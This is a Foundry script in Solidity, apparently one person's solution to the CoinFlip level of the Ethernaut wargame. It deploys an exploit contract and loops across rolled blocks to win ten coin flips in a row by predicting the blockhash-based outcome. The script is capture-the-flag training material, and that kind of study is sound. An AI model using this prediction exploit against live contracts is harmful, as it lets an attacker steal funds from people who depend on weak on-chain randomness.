// SPDX-License-Identifier: CC-BY-4.0
// Mia Stein solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {CoinFlip} from "src/03/CoinFlip.sol";
import {CoinFlipExploit} from "src/03/CoinFlipExploit.sol";


contract Exploit is Script {

    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint8 private immutable consecutiveWins = 10;
    address instance = vm.envAddress("INSTANCE_LEVEL3"); 
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    

    function run() public {
        vm.startBroadcast(hacker);

        CoinFlip level = CoinFlip(instance);
        CoinFlipExploit exploit = new CoinFlipExploit();
        
        vm.roll(block.number - consecutiveWins);
        
        for (uint256 i = 1; i < consecutiveWins + 1; i++) {
            uint256 lastBlockNumber = block.number;
            vm.roll(lastBlockNumber + 1);
            exploit.run(level);
        }

        console.log(level.consecutiveWins());

        vm.stopBroadcast();
    }
}